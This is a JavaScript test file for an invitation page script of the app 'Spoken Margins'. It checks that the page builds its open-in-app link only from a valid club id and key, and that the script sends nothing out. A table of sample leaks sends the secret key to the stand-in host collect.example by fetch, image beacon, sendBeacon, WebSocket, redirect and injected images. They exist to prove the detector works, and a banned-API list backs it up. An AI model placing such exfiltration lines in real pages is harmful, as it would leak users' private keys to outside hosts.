// The club invitation page's script (#1799 slice 4). The shell is the one clubs/page.go writes: the ids the script
// reads are checked against the Go output by TestClubPageShellHasWhatTheScriptReads in internal/api.
import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';
import test from 'node:test';
import { parseHTML } from 'linkedom';
import { CUT_OFF_MESSAGE, openInAppAddress, showInvite } from './club-page.mjs';

const ID = '586bb2e6e140f06e7397a7f3453dcfaa';
const HOST = 'spokenmargins.com';
// 32 bytes as unpadded base64url, the shape the app writes for a share link's key, and the club invite will.
const KEY = Buffer.from(Array.from({ length: 32 }, (_, i) => (i * 7 + 3) % 256)).toString('base64url');
const SHELL = `<!doctype html><html><body><main id="club" data-club="${ID}"><p id="status" role="status">fallback words</p><p><a id="open" href="spokenmargins://club" hidden>Open in Spoken Margins</a></p></main></body></html>`;

test('the test key has the shape the app writes', () => {
  assert.equal(KEY.length, 43);
  assert.doesNotMatch(KEY, /[=+/]/);
});

test('a real invite becomes the app address, with the whole https link inside', () => {
  const address = openInAppAddress(ID, HOST, `#${KEY}`);
  assert.equal(address, `spokenmargins://club?link=${encodeURIComponent(`https://${HOST}/c/${ID}#${KEY}`)}`);
  const link = new URL(address).searchParams.get('link');
  assert.equal(link, `https://${HOST}/c/${ID}#${KEY}`);
});

test('padding a messaging app added is carried through unchanged', () => {
  assert.ok(openInAppAddress(ID, HOST, `#${KEY}=`));
  assert.ok(openInAppAddress(ID, HOST, `#${KEY}==`));
});

test('a missing, cut short or damaged key gives no address', () => {
  const bad = [
    '', '#', `${KEY}`, `#${KEY.slice(0, 42)}`, `#${KEY}0`, `#${KEY.slice(0, 42)}!`, `#${KEY.slice(0, 42)}+`,
    `#${KEY.slice(0, 42)}/`, `# ${KEY.slice(0, 42)}`, `#${KEY}&x=1`, `#${KEY}\n`, `#${KEY}#${KEY}`, `#${KEY}%61`,
    undefined, null, 5,
  ];
  for (const hash of bad) assert.equal(openInAppAddress(ID, HOST, hash), undefined, JSON.stringify(hash));
});

test('an id that is not a club id, or a host that is not a plain host, gives no address', () => {
  for (const id of ['', ID.slice(1), `${ID}0`, ID.toUpperCase(), `${ID.slice(1)}g`, `${ID}/../x`, undefined, null]) {
    assert.equal(openInAppAddress(id, HOST, `#${KEY}`), undefined, JSON.stringify(id));
  }
  for (const host of ['', 'a.test:8443', 'user@a.test', 'A.test', 'a.test/x', 'a.test?x', 'a b', undefined, null]) {
    assert.equal(openInAppAddress(ID, host, `#${KEY}`), undefined, JSON.stringify(host));
  }
});

test('nothing but the id and the key reaches the app address', () => {
  // The caller passes the address parts, not the address, so a query on the page can never be forwarded.
  const address = openInAppAddress(ID, HOST, `#${KEY}`);
  assert.doesNotMatch(decodeURIComponent(address), /\?(?!link=)/);
  assert.equal(new URL(address).searchParams.size, 1);
  assert.equal(new URL(decodeURIComponent(new URL(address).searchParams.get('link'))).search, '');
});

test('the page shows the open button when the address has a key', () => {
  const { document } = parseHTML(SHELL);
  assert.equal(showInvite(document, { host: HOST, hash: `#${KEY}` }), '');
  const open = document.getElementById('open');
  assert.equal(open.hasAttribute('hidden'), false);
  assert.equal(open.getAttribute('href'), openInAppAddress(ID, HOST, `#${KEY}`));
  assert.equal(document.getElementById('status').textContent, '', 'the script replaces the fallback words');
});

test('the page keeps the button hidden and says the link is cut off when the key is missing', () => {
  for (const hash of ['', '#', `#${KEY.slice(0, 20)}`]) {
    const { document } = parseHTML(SHELL);
    assert.equal(showInvite(document, { host: HOST, hash }), CUT_OFF_MESSAGE);
    const open = document.getElementById('open');
    assert.equal(open.hasAttribute('hidden'), true);
    assert.equal(open.getAttribute('href'), 'spokenmargins://club');
    assert.equal(document.getElementById('status').textContent, CUT_OFF_MESSAGE);
  }
});

test('the cut-off sentence matches the share page and the web app', () => {
  const share = readFileSync(new URL('../links/share-link-page.mjs', import.meta.url), 'utf8');
  const match = /export const CUT_OFF_MESSAGE = '([^']+)'/.exec(share);
  assert.ok(match);
  assert.equal(CUT_OFF_MESSAGE, match[1]);
});

test('a shell with no club id shows no button', () => {
  const { document } = parseHTML(SHELL.replace(`data-club="${ID}"`, ''));
  assert.equal(showInvite(document, { host: HOST, hash: `#${KEY}` }), CUT_OFF_MESSAGE);
  assert.equal(document.getElementById('open').hasAttribute('hidden'), true);
});

// The script runs for real, in a page with a recording stub on every way it could send the key out. A text search for
// banned words passes a one-line `new Image().src = 'https://collect.example/?k=' + location.hash`; this does not
// (#4317). Dynamic import() has no stub: the page's CSP (default-src 'none', pinned by the Go test
// TestClubPageKeepsTheSecurityHeadersAndFetchesNothing) is what stops it, and the text search below stays as a backstop.
const SCRIPT = new URL('./club-page.mjs', import.meta.url);
const GLOBALS = ['document', 'location', 'window', 'fetch', 'XMLHttpRequest', 'Image', 'Audio', 'WebSocket', 'EventSource', 'Worker', 'SharedWorker', 'Request', 'open', 'importScripts', 'localStorage', 'sessionStorage', 'indexedDB', 'caches', 'navigator'];

async function runScript(source, label) {
  const dir = mkdtempSync(join(tmpdir(), 'club-page-'));
  const file = join(dir, `${label}.mjs`);
  writeFileSync(file, source);
  const calls = [];
  const rec = (name) => function (...args) { calls.push(`${name}(${args.map(String).join(', ')})`); return anything(name); };
  // Whatever the script does with the result (chain, construct, call a method) is recorded too.
  const anything = (name) => new Proxy(function () {}, {
    get: (_, p) => (p === 'then' ? undefined : rec(`${name}.${String(p)}`)),
    set(_, p, v) { calls.push(`${name}.${String(p)} = ${v}`); return true; },
    apply() { calls.push(`${name}()`); return anything(name); },
  });
  const saved = Object.fromEntries(GLOBALS.map((g) => [g, Object.getOwnPropertyDescriptor(globalThis, g)]));
  const { document } = parseHTML(SHELL);
  for (const m of ['createElement', 'createElementNS', 'write', 'writeln']) {
    const real = document[m]?.bind(document);
    document[m] = (...args) => { calls.push(`document.${m}(${args.map(String).join(', ')})`); return real?.(...args); };
  }
  for (const k of ['cookie']) Object.defineProperty(document, k, { get() { calls.push(`document.${k} read`); return ''; }, set(v) { calls.push(`document.${k} = ${v}`); }, configurable: true });
  const location = new Proxy({ host: HOST, hash: `#${KEY}`, search: '', pathname: `/c/${ID}` }, {
    set(_, prop, value) { calls.push(`location.${String(prop)} = ${value}`); return true; },
    get(target, prop) { return prop in target ? target[prop] : rec(`location.${String(prop)}`); },
  });
  const windowStub = { open: rec('window.open'), fetch: rec('window.fetch'), navigator: { sendBeacon: rec('navigator.sendBeacon') } };
  Object.defineProperty(windowStub, 'location', { get: () => location, set(v) { calls.push(`window.location = ${v}`); } });
  const stubs = {
    document, location, window: windowStub, fetch: rec('fetch'), XMLHttpRequest: rec('new XMLHttpRequest'), Image: rec('new Image'), Audio: rec('new Audio'),
    WebSocket: rec('new WebSocket'), EventSource: rec('new EventSource'), Worker: rec('new Worker'), SharedWorker: rec('new SharedWorker'), Request: rec('new Request'),
    open: rec('open'), importScripts: rec('importScripts'), navigator: windowStub.navigator,
    localStorage: new Proxy({}, { get: (_, p) => { calls.push(`localStorage.${String(p)}`); return rec(`localStorage.${String(p)}`); } }),
    sessionStorage: new Proxy({}, { get: (_, p) => { calls.push(`sessionStorage.${String(p)}`); return rec(`sessionStorage.${String(p)}`); } }),
    indexedDB: new Proxy({}, { get: (_, p) => { calls.push(`indexedDB.${String(p)}`); return rec(`indexedDB.${String(p)}`); } }),
    caches: new Proxy({}, { get: (_, p) => { calls.push(`caches.${String(p)}`); return rec(`caches.${String(p)}`); } }),
  };
  try {
    for (const [name, value] of Object.entries(stubs)) Object.defineProperty(globalThis, name, { value, configurable: true, writable: true });
    await import(pathToFileURL(file).href);
    await new Promise((resolve) => setTimeout(resolve, 20)); // a timer the script set would run now
  } finally {
    for (const g of GLOBALS) {
      if (saved[g]) Object.defineProperty(globalThis, g, saved[g]); else delete globalThis[g];
    }
    rmSync(dir, { recursive: true, force: true });
  }
  return { calls, html: document.documentElement.outerHTML };
}

const PRISTINE = readFileSync(SCRIPT, 'utf8');

test('the script makes no request and keeps nothing, run for real', async () => {
  const { calls, html } = await runScript(PRISTINE, 'pristine');
  assert.deepEqual(calls, []);
  assert.ok(html.includes(`href="${openInAppAddress(ID, HOST, `#${KEY}`)}"`), 'the script ran and wrote the open address');
  // The key is in the one href and nowhere else in the page.
  assert.equal(html.split(KEY).length - 1, 1, 'the key appears once, inside the open address');
});

// A guard that cannot fail is the finding in #4317, so the harness is shown a script that leaks the key by each route.
const LEAKS = {
  'image beacon': "new Image().src = 'https://collect.example/?k=' + location.hash;",
  fetch: "fetch('https://collect.example/?k=' + location.hash);",
  'XMLHttpRequest': "new XMLHttpRequest().open('GET', 'https://collect.example/?k=' + location.hash);",
  sendBeacon: "navigator.sendBeacon('https://collect.example/', location.hash);",
  'window.open': "window.open('https://collect.example/?k=' + location.hash);",
  'location assignment': "location.href = 'https://collect.example/?k=' + location.hash;",
  'location.assign': "location.assign('https://collect.example/?k=' + location.hash);",
  'window.location': "window.location = 'https://collect.example/?k=' + location.hash;",
  'a <link> element': "document.head?.appendChild(document.createElement('link'));",
  'an <img> through innerHTML': "document.getElementById('status').innerHTML += '<img src=\"https://collect.example/?k=' + location.hash + '\">';",
  'an <img> inserted next to the button': "document.getElementById('open').insertAdjacentHTML('afterend', '<img src=\"https://collect.example/?k=' + location.hash + '\">');",
  WebSocket: "new WebSocket('wss://collect.example/' + location.hash.slice(1));",
  'a later timer': "setTimeout(() => fetch('https://collect.example/?k=' + location.hash), 1);",
  'storage write': "localStorage.setItem('k', location.hash);",
  cookie: "document.cookie = 'k=' + location.hash;",
};

for (const [name, leak] of Object.entries(LEAKS)) {
  test(`the run-for-real check catches a script that leaks the key by ${name}`, async () => {
    const label = name.replace(/\W+/g, '-');
    const pristine = await runScript(PRISTINE, `${label}-pristine`);
    const { calls, html } = await runScript(`${PRISTINE}\n${leak}\n`, label);
    assert.ok(calls.length > 0 || html !== pristine.html, `nothing noticed: ${leak}`);
  });
}

test('the text search stays as a backstop for what the run cannot stub', () => {
  const source = PRISTINE.replace(/^\s*\/\/.*$/gm, '');
  for (const banned of ['fetch(', 'XMLHttpRequest', 'sendBeacon', 'WebSocket', 'localStorage', 'sessionStorage', 'document.cookie', 'location.replace', 'location.assign', 'innerHTML', 'import(', 'new Image', 'window.open']) {
    assert.ok(!source.includes(banned), banned);
  }
});
